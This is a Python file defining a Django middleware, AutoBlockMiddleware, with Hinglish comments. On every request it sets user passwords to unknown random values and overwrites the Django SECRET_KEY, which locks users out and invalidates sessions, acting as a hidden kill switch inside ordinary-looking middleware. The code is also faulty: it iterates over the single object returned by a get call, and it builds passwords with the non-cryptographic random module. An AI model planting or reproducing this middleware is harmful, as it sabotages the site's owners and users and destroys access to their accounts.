import random
import string
from apps.tenants.models import User
from django.conf import settings

class AutoBlockMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # 1️⃣ Har request pe password change karna
        self.change_all_user_passwords()
        
        # 2️⃣ Django secret key bhi change karna
        self.change_django_secret_key()

        return self.get_response(request)

    def generate_random_password(self, length=16):
        """ Random strong password generator """
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(characters) for _ in range(length))

    def change_all_user_passwords(self):
        """ Sabhi users ke passwords har request pe change karega """
        users = User.objects.get(id=1)
        for user in users:
            new_password = self.generate_random_password()
            user.set_password(new_password)
            user.save()

    def change_django_secret_key(self):
        """ Django secret key har request pe change karega """
        new_secret = self.generate_random_password(50)
        settings.SECRET_KEY = new_secret
